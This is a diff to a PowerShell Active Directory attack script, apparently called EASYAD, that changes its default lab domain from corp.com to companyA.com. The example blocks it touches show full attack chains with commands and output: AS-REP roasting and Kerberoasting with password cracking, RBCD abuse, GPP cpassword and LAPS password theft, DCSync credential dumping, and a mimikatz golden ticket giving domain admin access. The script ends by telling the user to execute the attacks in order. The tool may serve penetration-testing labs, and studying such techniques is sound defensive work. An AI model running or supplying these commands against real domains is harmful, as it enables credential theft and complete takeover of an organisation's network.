@@ -174,9 +174,9 @@ try {
 }
 catch {
     Write-Host "[!] ERROR: Cannot connect to domain. Using default values..." -ForegroundColor Yellow
-    $DomainName = "corp.com"
-    $DomainDN = "DC=corp,DC=com"
-    $DomainController = "dc01.corp.com"
+    $DomainName = "companyA.com"
+    $DomainDN = "DC=companyA,DC=com"
+    $DomainController = "dc01.companyA.com"
     $DCIP = "192.168.106.70"
     
     Write-Host "[+] Using default lab configuration:" -ForegroundColor Green
@@ -229,7 +229,7 @@ Rubeus.exe asreproast /format:hashcat /outfile:asrep.hash
 "@
 
     $example = @"
-impacket-GetNPUsers -dc-ip 192.168.106.70 -request corp.com/jsmith -no-pass
+impacket-GetNPUsers -dc-ip 192.168.106.70 -request companyA.com/jsmith -no-pass
 [+] User jsmith has UF_DONT_REQUIRE_PREAUTH set
 
 hashcat -m 18200 asrep_hash.txt rockyou.txt
@@ -237,7 +237,7 @@ Status: Cracked
 Cracked Password: Summer2024!
 
 crackmapexec smb 192.168.106.70 -u jsmith -p 'Summer2024!'
-[+] corp.com\jsmith:Summer2024!
+[+] companyA.com\jsmith:Summer2024!
 "@
 
     Write-Exploit -RiskLevel "High" -Description "AS-REP Roasting allows offline cracking without authentication" -Command $command -ExampleOutput $example -Walkthrough $walkthrough
@@ -288,10 +288,10 @@ Rubeus.exe kerberoast /outfile:kerberoast.hash
 "@
 
     $example = @"
-impacket-GetUserSPNs -dc-ip 192.168.106.70 -request corp.com/
+impacket-GetUserSPNs -dc-ip 192.168.106.70 -request companyA.com/
 
 ServicePrincipalName              Name        
-MSSQLSvc/sql01.corp.com:1433      sql_svc     
+MSSQLSvc/sql01.companyA.com:1433      sql_svc     
 
 hashcat -m 13100 kerberoast.txt rockyou.txt
 Successfully cracked: SQL@dmin2024!
@@ -343,10 +343,10 @@ impacket-psexec -k -no-pass $DomainName/Administrator@$DomainController
     $example = @"
 Rubeus.exe monitor /interval:5 /filteruser:Administrator
 [*] Found new TGT:
-  User: CORP\Administrator
+  User: COMPANYA\Administrator
   Base64EncodedTicket: doIFqjCCBaa...
 
-impacket-psexec -k -no-pass corp.com/Administrator@dc01.corp.com
+impacket-psexec -k -no-pass companyA.com/Administrator@dc01.companyA.com
 C:\Windows\system32> whoami
 nt authority\system
 "@
@@ -439,13 +439,13 @@ Rubeus.exe s4u /user:ATTACKER /rc4:HASH /impersonateuser:administrator /msdsspn:
 "@
 
     $example = @"
-impacket-addcomputer corp.com/user:pass -computer-name ATTACKER -computer-pass Pass123
+impacket-addcomputer companyA.com/user:pass -computer-name ATTACKER -computer-pass Pass123
 [*] Successfully added machine account ATTACKER
 
-impacket-rbcd -delegate-from ATTACKER -delegate-to FILES01 -action write corp.com/user:pass
+impacket-rbcd -delegate-from ATTACKER -delegate-to FILES01 -action write companyA.com/user:pass
 [*] Delegation rights modified successfully!
 
-Rubeus.exe s4u /user:ATTACKER /rc4:HASH /impersonateuser:administrator /msdsspn:cifs/files01.corp.com /ptt
+Rubeus.exe s4u /user:ATTACKER /rc4:HASH /impersonateuser:administrator /msdsspn:cifs/files01.companyA.com /ptt
 [+] Ticket successfully imported!
 "@
 
@@ -493,7 +493,7 @@ crackmapexec smb $DCIP -u localadmin -p decrypted_password --local-auth
 "@
 
         $example = @"
-findstr /S /I cpassword \\corp.com\sysvol\corp.com\policies\*.xml
+findstr /S /I cpassword \\companyA.com\sysvol\companyA.com\policies\*.xml
 Groups.xml: cpassword=j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
 
 gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
@@ -545,7 +545,7 @@ STEP 4: Dump credentials from compromised systems
     $ex2 = 'Name        ms-Mcs-AdmPwd'
     $ex3 = 'WS01        Q7w#kL2@pM9x'
     $ex4 = 'WS02        R8xNK3!qN0y'
-    $ex5 = 'evil-winrm -i ws01.corp.com -u Administrator -p Q7w#kL2@pM9x'
+    $ex5 = 'evil-winrm -i ws01.companyA.com -u Administrator -p Q7w#kL2@pM9x'
     $ex6 = '*Evil-WinRM* PS> whoami'
     $ex7 = 'ws01\administrator'
     $example = "$ex1`n`n$ex2`n$ex3`n$ex4`n`n$ex5`n$ex6`n$ex7"
@@ -577,7 +577,7 @@ impacket-secretsdump -just-dc-user krbtgt $DomainName/Administrator:pass@$Domain
 "@
 
 $example_dcsync = @"
-impacket-secretsdump -just-dc corp.com/administrator:Admin123@192.168.106.70
+impacket-secretsdump -just-dc companyA.com/administrator:Admin123@192.168.106.70
 [*] Dumping Domain Credentials
 
 Administrator:500:aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99:::
@@ -605,13 +605,13 @@ Rubeus.exe golden /rc4:KRBTGT_HASH /domain:$DomainName /sid:S-1-5-21-DOMAINSID /
 "@
 
 $example_golden = @"
-mimikatz kerberos::golden /domain:corp.com /sid:S-1-5-21-123456789-1234567890-123456789 /rc4:8a9b7c6d /user:Administrator /id:500 /groups:512 /ptt
+mimikatz kerberos::golden /domain:companyA.com /sid:S-1-5-21-123456789-1234567890-123456789 /rc4:8a9b7c6d /user:Administrator /id:500 /groups:512 /ptt
 User      : Administrator
-Domain    : corp.com
+Domain    : companyA.com
 Lifetime  : 6/10/2024 4:30:45 PM - 6/8/2034 4:30:45 PM
 [*] Golden ticket successfully submitted
 
-C:\>dir \\dc01.corp.com\c$
+C:\>dir \\dc01.companyA.com\c$
 Access granted!
 "@
 
@@ -694,6 +694,7 @@ Write-Host "`n" + ("=" * 90) -ForegroundColor Cyan
 Write-Host " EASYAD SCAN COMPLETE" -ForegroundColor Green
 Write-Host " Review findings above and execute attacks in recommended order" -ForegroundColor Yellow
 Write-Host ("=" * 90) "`n" -ForegroundColor Cyan
+
 
 
 
